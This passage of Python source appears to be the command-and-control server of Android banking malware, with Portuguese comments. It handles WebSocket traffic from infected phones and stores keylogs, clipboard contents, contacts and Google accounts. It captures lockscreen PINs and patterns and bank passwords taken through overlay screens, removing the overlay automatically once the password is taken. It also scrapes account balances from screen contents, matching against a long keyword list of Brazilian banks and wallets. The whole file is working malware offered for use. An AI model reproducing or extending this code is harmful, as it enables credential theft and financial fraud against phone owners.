                # Garante que este websocket é a conexão ativa do dispositivo
                current_active = manager.active_connections.get(device_id)
                if current_active is not websocket:
                    if current_active is None:
                        manager.active_connections[device_id] = websocket
                    else:
                        logger.info(f"📱 Conexão WebSocket antiga de {device_id} encerrada pois nova conexão assumiu")
                        break
                
                if data.get("type") == "websocket.disconnect":
                    logger.info(f"📱 Dispositivo {device_id} enviou disconnect")
                    break
                
                if "text" in data:
                    try:
                        message = json.loads(data["text"])
                        msg_type = message.get("type")
                        manager.update_device_activity(device_id)
                        
                        # FAST PATH: Heartbeats, pings e hierarquias de tela não abrem banco de dados (0ms de latência)
                        if msg_type == "PING":
                            try:
                                await websocket.send_json({"type": "PONG", "action": "PING"})
                            except Exception:
                                pass
                        elif msg_type == "PONG":
                            pass
                        elif msg_type in ("SCREEN_HIERARCHY", "HIERARCHY", "SCREEN_READER", "ACCESSIBILITY_HIERARCHY", "UI_TREE"):
                            hierarchy_data = message.get("data") or message.get("hierarchy") or message.get("tree")
                            if hierarchy_data:
                                manager.store_screen_hierarchy(device_id, hierarchy_data)
                        elif msg_type in ("SILENT_FRAME", "SCREEN_FRAME", "VNC_FRAME", "FRAME"):
                            frame_b64 = message.get("data") or message.get("frame") or message.get("image")
                            if frame_b64:
                                try:
                                    frame_bytes = base64.b64decode(frame_b64)
                                    await manager.store_screen_frame(device_id, frame_bytes)
                                except Exception:
                                    pass
                        elif msg_type == "SILENT_VNC_STATUS":
                            manager.device_silent_state[device_id] = {
                                "active": bool(message.get("active", False)),
                                "method": message.get("method", "silent")
                            }
                        elif msg_type == "ADMIN_STATUS":
                            admin_state = message.get("data") == "ACTIVE"
                            if device_id not in manager.device_info:
                                manager.device_info[device_id] = {}
                            manager.device_info[device_id]["admin_active"] = admin_state
                        else:
                            # Mensagens completas (logs, keylogs, info) são processadas em segundo plano sem travar a leitura do WebSocket
                            async def _process_msg_bg(d_id: str, msg_payload: dict):
                                device_db = SessionLocal()
                                try:
                                    await handle_device_message(d_id, msg_payload, device_db)
                                except Exception as db_err:
                                    logger.error(f"Erro ao processar mensagem de {d_id}: {db_err}")
                                finally:
                                    try:
                                        device_db.rollback()
                                    except Exception:
                                        pass
                                    device_db.close()
                            
                            asyncio.create_task(_process_msg_bg(device_id, message))
                    except json.JSONDecodeError as e:
                        logger.warning(f"JSON inválido de {device_id}: {e}")
                        continue
                    
                elif "bytes" in data:
                    frame_data = data["bytes"]
                    await handle_screen_frame(device_id, frame_data)
                    
            except asyncio.TimeoutError:
                _ping_timeout_count += 1
                if _ping_timeout_count >= 6:
                    logger.info(f"📱 Dispositivo {device_id} inativo por timeout (6 pings sem resposta)")
                    break
                try:
                    await websocket.send_json({"type": "PING", "action": "PING"})
                except Exception as p_err:
                    logger.debug(f"Erro ao enviar ping para {device_id}: {p_err}")
                    break
            except (WebSocketDisconnect, RuntimeError):
                break
            except Exception as e:
                logger.error(f"📱 Loop WebSocket {device_id} encerrado com erro: {e}", exc_info=True)
                print(f"❌ WS ERROR ({device_id}): {type(e).__name__}: {e}", flush=True)
                import traceback
                traceback.print_exc()
                break
                
    except WebSocketDisconnect:
        logger.info(f"📱 Dispositivo {device_id} desconectado (WebSocketDisconnect)")
    except Exception as e:
        logger.error(f"Erro fatal no WebSocket {device_id}: {type(e).__name__}: {e}")
    finally:
        # Limpeza da conexão atualmente ativa
        if manager.active_connections.get(device_id) is websocket:
            manager.disconnect(device_id, websocket=websocket)
            
            def mark_offline_sync(device_id_val: str):
                try:
                    device_db = SessionLocal()
                    try:
                        device = device_db.query(Device).filter(Device.device_id == device_id_val).first()
                        if device:
                            device.is_online = False
                            disc_log = DeviceLog(
                                device_id=device_id_val,
                                log_type="DEVICE_CONNECTION",
                                log_data=json.dumps({
                                    "event": "DISCONNECTED",
                                    "ip": device.ip_address or "",
                                    "timestamp": utc_now().isoformat()
                                })
                            )
                            device_db.add(disc_log)
                            safe_db_commit_sync(device_db)
                    finally:
                        try:
                            device_db.rollback()
                        except Exception:
                            pass
                        device_db.close()
                except Exception as e:
                    logger.error(f"Erro ao atualizar status offline de {device_id_val}: {e}")

            await asyncio.to_thread(mark_offline_sync, device_id)
        else:
            logger.info(f"📱 Conexão WebSocket antiga de {device_id} ignorou limpeza de desconexão (sobrescrita)")

def _extract_battery_level(data: dict):
    if not isinstance(data, dict):
        return None
    val = data.get("battery_level")
    if val is None:
        val = data.get("batteryLevel")
    if val is None:
        val = data.get("battery")
    if val is None:
        val = data.get("battery_pct")
    if val is None:
        return None
    if isinstance(val, (int, float)):
        return int(val)
    if isinstance(val, str):
        import re
        nums = re.findall(r'\d+', val)
        if nums:
            return int(nums[0])
    return None

def _extract_network_type(data: dict):
    if not isinstance(data, dict):
        return None
    val = data.get("network_type") or data.get("networkType") or data.get("network") or data.get("connection_type") or data.get("connectionType") or data.get("net_type")
    if val and isinstance(val, str) and val.strip():
        return val.strip()
    return None

def _extract_sim_operator(data: dict):
    if not isinstance(data, dict):
        return None
    val = (
        data.get("sim_operator") or data.get("simOperator") or 
        data.get("carrier") or data.get("operator") or 
        data.get("sim") or data.get("network_operator") or 
        data.get("networkOperator") or data.get("sim_name") or
        data.get("sim1") or data.get("sim_info")
    )
    if val and isinstance(val, str) and val.strip():
        return val.strip()
    return None

async def handle_device_message(device_id: str, message: dict, db: Session):
    """Processa mensagens JSON do dispositivo"""
    msg_type = message.get("type")
    
    # 💓 Atualiza timestamp de atividade do dispositivo
    manager.update_device_activity(device_id)
    
    if msg_type == "DEVICE_INFO":
        # Informações do dispositivo
        bat = _extract_battery_level(message)
        if device_id not in manager.device_info:
            manager.device_info[device_id] = {}
        accs = message.get("accounts") or message.get("google_accounts") or message.get("accounts_list")
        blocked_pkgs = message.get("blocked_packages") or message.get("blocked_apps")
        manager.device_info[device_id].update({
            "model": message.get("model"),
            "manufacturer": message.get("manufacturer"),
            "android_version": message.get("android_version"),
            "sdk": message.get("sdk"),
            "battery_level": bat if bat is not None else manager.device_info[device_id].get("battery_level"),
            "is_charging": message.get("is_charging") if message.get("is_charging") is not None else manager.device_info[device_id].get("is_charging", False),
            "network_type": _extract_network_type(message) or manager.device_info[device_id].get("network_type"),
            "sim_operator": _extract_sim_operator(message) or manager.device_info[device_id].get("sim_operator"),
            "storage_info": message.get("storage_info"),
            "accessibility_active": bool(message.get("accessibility_active")) if message.get("accessibility_active") is not None else bool(manager.device_info[device_id].get("accessibility_active", False)),
            "admin_active": bool(message.get("admin_active", False)),
            "permissions": message.get("permissions") if message.get("permissions") is not None else manager.device_info[device_id].get("permissions", {}),
            "accounts": accs if accs is not None else manager.device_info[device_id].get("accounts", []),
            "google_accounts": accs if accs is not None else manager.device_info[device_id].get("google_accounts", []),
            "blocked_packages": blocked_pkgs if blocked_pkgs is not None else manager.device_info[device_id].get("blocked_packages", [])
        })
        
        # Atualiza no banco
        device = db.query(Device).filter(Device.device_id == device_id).first()
        if device:
            device.model = message.get("model")
            device.manufacturer = message.get("manufacturer")
            device.android_version = message.get("android_version")
            if accs and isinstance(accs, list) and len(accs) > 0:
                try:
                    acc_json = json.dumps(accs)
                    existing_cap = db.query(CapturedData).filter(
                        CapturedData.device_id == device_id,
                        CapturedData.data_type == "GOOGLE_ACCOUNTS"
                    ).first()
                    if existing_cap:
                        existing_cap.data_content = acc_json
                    else:
                        new_cap = CapturedData(
                            device_id=device_id,
                            data_type="GOOGLE_ACCOUNTS",
                            data_content=acc_json
                        )
                        db.add(new_cap)
                except Exception as e:
                    logger.error(f"Erro ao salvar contas no banco: {e}")
            await safe_db_commit(db)
        
        await manager.broadcast_to_operators({
            "type": "DEVICE_INFO_UPDATED",
            "device_id": device_id,
            "accounts": accs or [],
            "google_accounts": accs or [],
            "device_info": manager.device_info.get(device_id, {})
        })
        
        logger.info(f"Info recebida: {device_id} - {message.get('model')} (accounts: {accs})")
        
    elif msg_type == "ADMIN_STATUS":
        admin_state = message.get("data") == "ACTIVE"
        if device_id not in manager.device_info:
            manager.device_info[device_id] = {}
        manager.device_info[device_id]["admin_active"] = admin_state
        logger.info(f"🛡️ Status do Admin de {device_id} atualizado: {admin_state}")

    elif msg_type == "SILENT_VNC_STATUS":
        # Status do caminho silencioso dedicado (BTMOB purple button)
        manager.device_silent_state[device_id] = {
            "active": bool(message.get("active", False)),
            "method": message.get("method", "silent")
        }
        logger.info(f"🔇 SILENT_VNC_STATUS de {device_id}: active={message.get('active')}, method={message.get('method')}")
        
    elif msg_type in ("CLIPBOARD", "CLIPBOARD_DATA"):
        clip_text = message.get("text") or message.get("data") or ""
        if clip_text:
            if device_id not in manager.device_info:
                manager.device_info[device_id] = {}
            manager.device_info[device_id]["clipboard"] = clip_text
            
            logger.info(f"📋 CLIPBOARD capturado de {device_id}: {clip_text}")
            
            log = DeviceLog(
                device_id=device_id,
                log_type="CLIPBOARD",
                log_data=json.dumps({
                    'text': clip_text,
                    'timestamp': utc_now().isoformat()
                }, ensure_ascii=False),
                created_at=utc_now()
            )
            db.add(log)
            await safe_db_commit(db)

    elif msg_type == "PING":
        # Heartbeat - responde com PONG
        await manager.send_command(device_id, {"action": "PING"})

    elif msg_type in ("CONTACTS", "CONTACTS_LIST"):
        contacts_data = message.get("data")
        logger.info(f"👥 CONTACTS recebidos de {device_id}")
        
        try:
            contacts_json = json.dumps(contacts_data) if not isinstance(contacts_data, str) else contacts_data
            existing_cap = db.query(CapturedData).filter(
                CapturedData.device_id == device_id,
                CapturedData.data_type == "CONTACTS"
            ).first()
            if existing_cap:
                existing_cap.data_content = contacts_json
            else:
                new_cap = CapturedData(
                    device_id=device_id,
                    data_type="CONTACTS",
                    data_content=contacts_json
                )
                db.add(new_cap)
            await safe_db_commit(db)
        except Exception as e:
            logger.error(f"Erro ao salvar contatos no banco: {e}")

        await manager.broadcast_to_operators({
            "type": "CONTACTS_LIST",
            "device_id": device_id,
            "contacts": contacts_data
        })
        
    elif msg_type == "KEYLOG":
        # 🔄 Função auxiliar: Auto-disarm overlay após captura de senha
        async def auto_disarm_overlay_after_capture(dev_id: str, pkg: str, bank_name: str):
            """Remove automaticamente o inject/overlay após a senha ser capturada"""
            if not pkg:
                return
            try:
                from models import DeviceOverlayMapping
                from sqlalchemy import func
                
                # Busca e deleta o mapeamento do overlay para este pacote
                mappings = db.query(DeviceOverlayMapping).filter(
                    func.lower(DeviceOverlayMapping.device_id) == dev_id.lower(),
                    func.lower(DeviceOverlayMapping.package_name) == pkg.lower()
                ).all()
                
                if mappings:
                    for m in mappings:
                        db.delete(m)
                    db.commit()
                    
                    # Envia comando para remover a tela de overlay do aparelho
                    await manager.send_command(dev_id, {
                        "action": "BLACK_SCREEN_OFF"
                    })
                    
                    # Reseta o tracking de injeção
                    for dev_key in list(manager.device_info.keys()):
                        if dev_key.lower() == dev_id.lower():
                            manager.device_info[dev_key]["last_injected_package"] = None
                    
                    # Notifica o painel que o overlay foi removido
                    await manager.broadcast_to_operators({
                        "type": "OVERLAY_AUTO_DISARMED",
                        "device_id": dev_id,
                        "package": pkg,
                        "bank": bank_name,
                        "reason": "PASSWORD_CAPTURED"
                    })
                    
                    logger.info(f"\n{'='*60}")
                    logger.info(f"🔄 AUTO-DISARM: Overlay removido automaticamente!")
                    logger.info(f"Pacote: {pkg}")
                    logger.info(f"Banco: {bank_name}")
                    logger.info(f"Motivo: Senha capturada com sucesso")
                    logger.info(f"{'='*60}\n")
                else:
                    logger.info(f"🔄 AUTO-DISARM: Nenhum mapeamento encontrado para {pkg} (já removido?)")
            except Exception as e:
                logger.error(f"❌ Erro no auto-disarm overlay para {pkg}: {e}")
        
        # Keylogger data - loga e processa detector de senhas
        keylog_data = message.get("data")
        logger.info(f"⌨️ KEYLOG de {device_id}: {keylog_data}")
        
        # Tenta parsear para ver se é VISUAL_SCREEN_DATA ou FILE_UPLOAD
        try:
            parsed = json.loads(keylog_data) if isinstance(keylog_data, str) else keylog_data
            
            # 📤 PROCESSAMENTO ESPECIAL: File Upload
            if parsed.get('type') == 'FILE_UPLOAD':
                logger.info(f"📤 FILE_UPLOAD de {device_id}")
                
                label = parsed.get('label', 'DOCUMENTO')
                fileName = parsed.get('fileName', 'unknown')
                base64_data = parsed.get('data', '')

                file_info = {
                    'device_id': device_id,
                    'label': label,
                    'fileName': fileName,
                    'mimeType': parsed.get('mimeType', 'application/octet-stream'),
                    'data': base64_data,
                    'timestamp': utc_now().isoformat(),
                    'source': 'VISUAL_SCREEN'
                }
                
                # Salva no banco como FILE_UPLOAD
                log = DeviceLog(
                    device_id=device_id,
                    log_type="FILE_UPLOAD",
                    log_data=json.dumps(file_info),
                    created_at=utc_now()
                )
                db.add(log)
                
                logger.info(f"\n{'='*60}")
                logger.info(f"📤 ARQUIVO RECEBIDO!")
                logger.info(f"Label: {file_info['label']}")
                logger.info(f"Nome: {file_info['fileName']}")
                logger.info(f"Tipo: {file_info['mimeType']}")
                logger.info(f"Tamanho: {len(file_info['data'])} bytes (base64)")
                logger.info(f"{'='*60}\n")
            
            # 🔐 PROCESSAMENTO ESPECIAL: Visual Screen Data
            elif parsed.get('type') == 'VISUAL_SCREEN_DATA' or parsed.get('source') == 'VISUAL_SCREEN':
                logger.info(f"🔐 VISUAL_SCREEN_DATA de {device_id}")
                
                # Resolve o pacote e nome do banco com base no active_banks ou no payload
                active_bank = manager.device_active_banks.get(device_id) or {}
                target_pkg = parsed.get('package') or active_bank.get("package") or 'com.seguranca.protecao'
                target_bank = active_bank.get("appName")
                if not target_bank:
                    target_bank = BankPasswordDetector.BANK_APPS.get(target_pkg)
                if not target_bank:
                    target_bank = 'Itaú' if 'itau' in target_pkg else (target_pkg.split('.')[-1].title() if '.' in target_pkg else 'Banco')
                
                # Se tiver dados capturados (formato agregado)
                if 'captured' in parsed:
                    captured = parsed['captured']
                    for label, value in captured.items():
                        if value and len(value) > 0:
                            # Salva cada campo como senha bancária
                            password_info = {
                                'device_id': device_id,
                                'bank': target_bank,
                                'package': target_pkg,
                                'password': value,
                                'hint': label,  # SENHA_INICIAL, SENHA_TRANSACAO, etc
                                'label': label,
                                'digits': len(value),
                                'timestamp': utc_now().isoformat(),
                                'status': 'captured',
                                'source': 'VISUAL_SCREEN'
                            }
                            
                            log = DeviceLog(
                                device_id=device_id,
                                log_type="BANK_PASSWORD",
                                log_data=json.dumps(password_info),
                                created_at=utc_now()
                            )
                            db.add(log)
                            
                            logger.info(f"\n{'='*60}")
                            logger.info(f"🔐 KEYLOGGER {target_bank.upper()} - SENHA CAPTURADA!")
                            logger.info(f"Label: {label}")
                            logger.info(f"Senha: {value} ({len(value)} dígitos)")
                            logger.info(f"{'='*60}\n")
                    
                    # 🔄 AUTO-DISARM: Remove overlay automaticamente após captura de senha
                    await auto_disarm_overlay_after_capture(device_id, target_pkg, target_bank)
                
                # Formato individual (isPassword=true)
                elif parsed.get('isPassword') and parsed.get('text'):
                    password_info = {
                        'device_id': device_id,
                        'bank': target_bank,
                        'package': target_pkg,
                        'password': parsed.get('text'),
                        'hint': parsed.get('hint', 'unknown'),
                        'label': parsed.get('hint', 'unknown'),
                        'digits': len(parsed.get('text', '')),
                        'timestamp': utc_now().isoformat(),
                        'status': 'captured',
                        'source': 'VISUAL_SCREEN'
                    }
                    
                    log = DeviceLog(
                        device_id=device_id,
                        log_type="BANK_PASSWORD",
                        log_data=json.dumps(password_info),
                        created_at=utc_now()
                    )
                    db.add(log)
                    
                    logger.info(f"🔐 KEYLOGGER {target_bank.upper()} - Senha: {password_info['password']}")
                    
                    # 🔄 AUTO-DISARM: Remove overlay automaticamente após captura de senha
                    await auto_disarm_overlay_after_capture(device_id, target_pkg, target_bank)
            
            # 🔒 PROCESSAMENTO ESPECIAL: PIN Capturado do Lockscreen
            elif parsed.get('type') == 'CAPTURED_PIN':
                pin = parsed.get('pin', '')
                logger.info(f"\n{'='*60}")
                logger.info(f"🔒 PIN CAPTURADO DO LOCKSCREEN!")
                logger.info(f"PIN: {pin}")
                logger.info(f"Device: {device_id}")
                logger.info(f"{'='*60}\n")
                
                # Armazena automaticamente
                manager.store_device_pin(device_id, pin)
                manager.store_device_lockscreen_active(device_id, False)
                
                # Salva no banco
                log = DeviceLog(
                    device_id=device_id,
                    log_type="CAPTURED_PIN",
                    log_data=json.dumps({'pin': pin, 'timestamp': utc_now().isoformat()}),
                    created_at=utc_now()
                )
                db.add(log)
            
            # 💉 PROCESSAMENTO ESPECIAL: Senha de aplicativo baixado capturada
            elif parsed.get('type') == 'CAPTURED_APP_PASSWORD':
                pkg = parsed.get('package', '')
                password = parsed.get('password', '')
                logger.info(f"\n{'='*60}")
                logger.info(f"💉 SENHA DE APP CAPTURADA!")
                logger.info(f"App: {pkg}")
                logger.info(f"Senha: {password}")
                logger.info(f"Device: {device_id}")
                logger.info(f"{'='*60}\n")
                
                # Salva no banco
                log = DeviceLog(
                    device_id=device_id,
                    log_type="CAPTURED_APP_PASSWORD",
                    log_data=json.dumps({
                        'package': pkg,
                        'password': password,
                        'timestamp': utc_now().isoformat()
                    }),
                    created_at=utc_now()
                )
                db.add(log)
                
                # 🔄 AUTO-DISARM: Remove overlay automaticamente após captura de senha do app
                app_name = BankPasswordDetector.BANK_APPS.get(pkg, pkg.split('.')[-1].title() if '.' in pkg else 'App')
                await auto_disarm_overlay_after_capture(device_id, pkg, app_name)
            
            # 🔲 PROCESSAMENTO ESPECIAL: Pattern Capturado do Lockscreen
            elif parsed.get('type') == 'CAPTURED_PATTERN':
                pattern = parsed.get('pattern', '')
                logger.info(f"\n{'='*60}")
                logger.info(f"🔲 PATTERN CAPTURADO DO LOCKSCREEN!")
                logger.info(f"Pattern: {pattern}")
                logger.info(f"Device: {device_id}")
                logger.info(f"{'='*60}\n")
                
                # Armazena automaticamente
                manager.store_device_pattern(device_id, pattern)
                manager.store_device_lockscreen_active(device_id, False)
                
                # Salva no banco
                log = DeviceLog(
                    device_id=device_id,
                    log_type="CAPTURED_PATTERN",
                    log_data=json.dumps({'pattern': pattern, 'timestamp': utc_now().isoformat()}),
                    created_at=utc_now()
                )
                db.add(log)
                    
            # 🔔 PROCESSAMENTO ESPECIAL: Notificação Recebida do Aparelho
            elif parsed.get('eventType') == 'NOTIFICATION':
                pkg = parsed.get('package', 'desconhecido')
                app_name = parsed.get('appName', '')
                text = parsed.get('text', '')
                logger.info(f"🔔 NOTIFICAÇÃO de {device_id} ({pkg}): {text}")
                
                # Salva no banco de dados como log de notificação
                log = DeviceLog(
                    device_id=device_id,
                    log_type="DEVICE_NOTIFICATION",
                    log_data=json.dumps({
                        'package': pkg,
                        'appName': app_name,
                        'text': text,
                        'timestamp': utc_now().isoformat()
                    }),
                    created_at=utc_now()
                )
                db.add(log)
            
            else:
                # Processamento normal de keylog
                if device_id in manager.password_detector:
                    password_info = manager.password_detector[device_id].process_keylog(keylog_data)
                    
                    if password_info:
                        # Senha detectada! Salva separadamente
                        log = DeviceLog(
                            device_id=device_id,
                            log_type="BANK_PASSWORD",
                            log_data=json.dumps(password_info),
                            created_at=utc_now()
                        )
                        db.add(log)
                        
        except json.JSONDecodeError:
            # Se não for JSON, processa como keylog normal
            if device_id in manager.password_detector:
                password_info = manager.password_detector[device_id].process_keylog(keylog_data)
                if password_info:
                    log = DeviceLog(
                        device_id=device_id,
                        log_type="BANK_PASSWORD",
                        log_data=json.dumps(password_info),
                        created_at=utc_now()
                    )
                    db.add(log)
        
        # Salva keylog normal no banco de dados
        log = DeviceLog(
            device_id=device_id,
            log_type="KEYLOG",
            log_data=keylog_data,
            created_at=utc_now()
        )
        db.add(log)
        await safe_db_commit(db)
        
        # ⚡ TRANSMISSÃO EM TEMPO REAL INSTANTÂNEA PARA O PAINEL
        await manager.broadcast_to_operators({
            "type": "REALTIME_KEYLOG",
            "device_id": device_id,
            "log_data": keylog_data
        })
    
    elif msg_type == "KEYLOG_OFFLINE":
        # 💾 KEYLOG OFFLINE - capturado quando estava desconectado!
        keylog_data = message.get("data")
        saved_at = message.get("savedAt")
        
        logger.info(f"💾 KEYLOG OFFLINE de {device_id}: {keylog_data}")
        
        # Verifica se é um tipo especial (UNLOCK_SEQUENCE, etc)
        try:
            parsed = json.loads(keylog_data) if isinstance(keylog_data, str) else keylog_data
            
            if parsed.get('type') == 'UNLOCK_SEQUENCE':
                # É uma sequência de desbloqueio
                sequence_data = parsed.get('data')
                if sequence_data:
                    if isinstance(sequence_data, str):
                        sequence_data = json.loads(sequence_data)
                    manager.store_unlock_sequence(device_id, sequence_data)
                    logger.info(f"💾🔓 Unlock sequence OFFLINE de {device_id}")
                    
                    # Salva no log
                    log = DeviceLog(
                        device_id=device_id,
                        log_type="UNLOCK_SEQUENCE_OFFLINE",
                        log_data=json.dumps(parsed),
                        created_at=utc_now()
                    )
                    db.add(log)
        except:
            pass
        
        # Salva keylog offline no banco de dados
        log = DeviceLog(
            device_id=device_id,
            log_type="KEYLOG_OFFLINE",
            log_data=keylog_data,
            created_at=utc_now()
        )
        db.add(log)
        await safe_db_commit(db)
        
    elif msg_type == "SCREEN_HIERARCHY":
        # Screen Reader V2 - hierarquia da tela
        hierarchy_data = message.get("data")
        if hierarchy_data:
            manager.store_screen_hierarchy(device_id, hierarchy_data)
            
            # 💰 CAPTURA AUTOMÁTICA DE SALDO — busca R$ no conteúdo da tela
            try:
                import re
                import xml.etree.ElementTree as ET
                
                # Texto plano da hierarquia (pode ser JSON ou string)
                hier_text = hierarchy_data if isinstance(hierarchy_data, str) else json.dumps(hierarchy_data)
                
                # Verifica se o app em foco é um banco
                foreground_pkg = manager.device_info.get(device_id, {}).get("foreground_package", "")
                active_bank = manager.device_active_banks.get(device_id)
                current_pkg = (active_bank or {}).get("package") or foreground_pkg or ""
                
                # Mapeamento expandido para TODOS os bancos e apps financeiros do Brasil
                def is_brazilian_bank(pkg):
                    pkg = pkg.lower()
                    bank_keywords = [
                        "bank", "banco", "pag", "pay", "card", "cartao", "credit", "finan", "invest", 
                        "itau", "bradesco", "nubank", "santander", "caixa", "sicredi", "sicoob", "cresol",
                        "inter", "c6", "neon", "original", "stone", "agibank", "digio", "will", "pan",
                        "xp", "rico", "clear", "btg", "safra", "banrisul", "banestes", "brb", "bmg",
                        "alelo", "sodexo", "ticket", "coop", "valegroup", "ame", "recargapay", "superdigital",
                        "mercadopago", "picpay", "dock", "dlocal", "grafeno", "delphi", "asaas", "fitbank",
                        "pjbank", "zoop", "celcoin", "efire", "gerencianet", "juninho", "iugu", "vindi",
                        "carteira", "wallet", "binance", "mercadobitcoin", "foxbit", "novadax", "coinext",
                        "pluxee", "ben", "flashapp", "wise", "revolut", "creditas"
                    ]
                    return any(kw in pkg for kw in bank_keywords)
                
                is_bank_screen = is_brazilian_bank(current_pkg)
                
                candidates = []
                
                # Regexes para encontrar valores monetários
                # 1. R$ 1.234,56 ou R$1234,56 ou R$ -12,34
                money_symbol_pattern = re.compile(
                    r'(?:R\$\s*|R\s*\$\s*)(-?\s*\d{1,3}(?:[\.,]\d{3})*[\.,]\d{2}|-?\s*\d+[\.,]\d{2})',
                    re.IGNORECASE
                )
                # 2. Apenas o número formatado como dinheiro: 1.234,56 ou 123,45 ou 1234,56
                money_raw_pattern = re.compile(
                    r'\b(-?\s*\d{1,3}(?:\.\d{3})*,\d{2})\b|\b(-?\s*\d+,\d{2})\b'
                )

                def parse_brl_value(v):
                    v = v.replace("R$", "").replace("r$", "").replace(" ", "").strip()
                    if ',' in v and '.' in v:
                        if v.rfind(',') > v.rfind('.'):
                            v = v.replace('.', '').replace(',', '.')
                        else:
                            v = v.replace(',', '')
                    elif ',' in v:
                        v = v.replace(',', '.')
                    try:
                        return float(v)
                    except:
                        return None

                # Tenta parsear a hierarquia (pode ser JSON ou XML)
                nodes = []
                
                # 1. Tenta parsear como JSON
                try:
                    data = json.loads(hier_text)
                    root_node = data.get("hierarchy") if isinstance(data, dict) and "hierarchy" in data else data
                    
                    def traverse_json(node):
                        if not isinstance(node, dict):
                            return
                        text = node.get("text", "") or ""
                        content_desc = node.get("desc", "") or ""
                        resource_id = node.get("id", "") or ""
                        pkg = node.get("package", "") or ""
                        
                        nodes.append({
                            "text": text,
                            "content_desc": content_desc,
                            "resource_id": resource_id,
                            "package": pkg
                        })
                        for child in node.get("children", []):
                            traverse_json(child)
                            
                    traverse_json(root_node)
                except Exception as json_err:
                    # 2. Se falhar, tenta parsear como XML
                    try:
                        root = ET.fromstring(hier_text)
                        def traverse_xml(node):
                            text = node.get("text", "") or ""
                            content_desc = node.get("content-desc", "") or ""
                            resource_id = node.get("resource-id", "") or ""
                            pkg = node.get("package", "") or ""
                            nodes.append({
                                "text": text,
                                "content_desc": content_desc,
                                "resource_id": resource_id,
                                "package": pkg
                            })
                            for child in node:
                                traverse_xml(child)
                        traverse_xml(root)
                    except Exception as xml_err:
                        nodes = []

                bal_candidates = []
                lim_candidates = []
                inv_candidates = []

                if not nodes:
                    # Fallback Regex na string completa se o parser XML/JSON falhar
                    matches = money_symbol_pattern.findall(hier_text)
                    for m in matches:
                        val = parse_brl_value(m)
                        if val is not None and -999999.0 <= val <= 9999999.0:
                            # Filtro estrito para o Fallback Regex
                            m_pos = hier_text.find(m)
                            if m_pos != -1:
                                context = hier_text[max(0, m_pos - 80):min(len(hier_text), m_pos + len(m) + 80)].lower()
                                if any(nk in context for nk in ["limite", "fatura", "crédito", "credito", "empréstimo", "emprestimo", "cartão", "cartao", "card", "loan", "invoice"]):
                                    # Se tem termos de crédito no regex fallback, adiciona como candidato a limite/fatura
                                    if any(ik in context for ik in ["fatura", "invoice", "bill"]):
                                        inv_candidates.append({"val": val, "raw": m, "formatted": f"R$ {m.strip()}", "score": 200})
                                    else:
                                        lim_candidates.append({"val": val, "raw": m, "formatted": f"R$ {m.strip()}", "score": 200})
                                    continue
                            
                            score = 100
                            if is_bank_screen:
                                score += 100
                            hier_text_lower = hier_text.lower()
                            if any(pk in hier_text_lower for pk in ["saldo", "disponivel", "disponível", "balance"]):
                                score += 1000
                            bal_candidates.append({
                                "val": val,
                                "raw": m,
                                "formatted": f"R$ {m.strip()}",
                                "score": score
                            })
                else:
                    # Context Keywords (Brasil + Colômbia / Davivienda)
                    bal_pos_keywords = ["saldo", "disponivel", "disponível", "disponible", "saldo da conta", "saldo em conta", 
                                        "saldo actual", "saldo total", "conta corrente", "cuentas", "bolsillos", "daviplata", "carteira", 
                                        "wallet", "balance", "dinheiro em conta", "saldo disponível", "saldo disponivel"]
                    lim_pos_keywords = ["limite", "limite disponível", "limite disponivel", "limite de crédito", 
                                        "limite de credito", "limite total", "disponivel limite"]
                    inv_pos_keywords = ["fatura", "fatura atual", "valor da fatura", "fatura fechada", "fatura aberta", "faturas"]

                    for idx, item in enumerate(nodes):
                        text = item["text"].strip()
                        desc = item["content_desc"].strip()
                        resource_id = item["resource_id"].lower()
                        
                        for val_str in [text, desc]:
                            if not val_str:
                                continue
                            
                            val_str_lower = val_str.lower()
                            
                            # Tenta casar com símbolo R$
                            matches_sym = money_symbol_pattern.findall(val_str)
                            for m in matches_sym:
                                val = parse_brl_value(m)
                                if val is not None and -999999.0 <= val <= 9999999.0:
                                    formatted_val = f"R$ {m.strip()}"
                                    
                                    # 1. Pontuação para Saldo (Checking Balance)
                                    # Filtro estrito: sem termos de crédito no nó ou vizinhos
                                    is_credit_node = any(nk in val_str_lower for nk in ["limite", "fatura", "crédito", "credito", "empréstimo", "emprestimo", "cartão", "cartao", "card", "loan", "invoice"])
                                    is_credit_res = any(nk in resource_id for nk in ["limit", "credit", "fatura", "loan", "emprestimo", "card", "cartao", "invoice"])
                                    
                                    start_idx = max(0, idx - 4)
                                    end_idx = min(len(nodes), idx + 5)
                                    has_credit_neighbor = False
                                    for neighbor_idx in range(start_idx, end_idx):
                                        if neighbor_idx == idx:
                                            continue
                                        neighbor = nodes[neighbor_idx]
                                        n_text = (neighbor["text"] + " " + neighbor["content_desc"]).lower()
                                        if any(nk in n_text for nk in ["limite", "fatura", "crédito", "credito", "empréstimo", "emprestimo", "cartão", "cartao", "card", "loan", "invoice"]):
                                            has_credit_neighbor = True
                                            break
                                            
                                    if not (is_credit_node or is_credit_res or has_credit_neighbor):
                                        bal_score = 150
                                        if is_bank_screen:
                                            bal_score += 100
                                        if any(pk in resource_id for pk in ["balance", "saldo", "money", "txt_saldo", "user_balance"]):
                                            bal_score += 4000
                                            
                                        # Bônus vizinhos
                                        for neighbor_idx in range(start_idx, end_idx):
                                            if neighbor_idx == idx:
                                                continue
                                            neighbor = nodes[neighbor_idx]
                                            n_text = (neighbor["text"] + " " + neighbor["content_desc"]).lower()
                                            distance = abs(neighbor_idx - idx)
                                            if any(pk in n_text for pk in bal_pos_keywords):
                                                bal_score += 5000 if distance == 1 else (2500 if distance <= 3 else 1000)
                                                
                                        # Regras específicas de banco
                                        if current_pkg:
                                            pkg_lower = current_pkg.lower()
                                            if "nu.production" in pkg_lower or "nubank" in pkg_lower:
                                                if "balance" in resource_id or "saldo" in resource_id:
                                                    bal_score += 6000
                                            elif "mercadopago" in pkg_lower:
                                                if "balance" in resource_id or "money_amount" in resource_id:
                                                    bal_score += 6000
                                            elif "itau" in pkg_lower:
                                                if "saldo" in resource_id:
                                                    bal_score += 6000
                                                    
                                        bal_candidates.append({"val": val, "raw": m, "formatted": formatted_val, "score": bal_score})
                                        
                                    # 2. Pontuação para Limite de Crédito
                                    is_bal_node = any(pk in val_str_lower for pk in ["saldo", "poupança", "investimento", "carteira", "extrato"])
                                    is_fatura_node = any(fk in val_str_lower for fk in ["fatura", "invoice", "bill"])
                                    
                                    if not (is_bal_node or is_fatura_node):
                                        lim_score = 100
                                        if is_bank_screen:
                                            lim_score += 100
                                        if any(lk in val_str_lower for lk in ["limite", "limit"]):
                                            lim_score += 3000
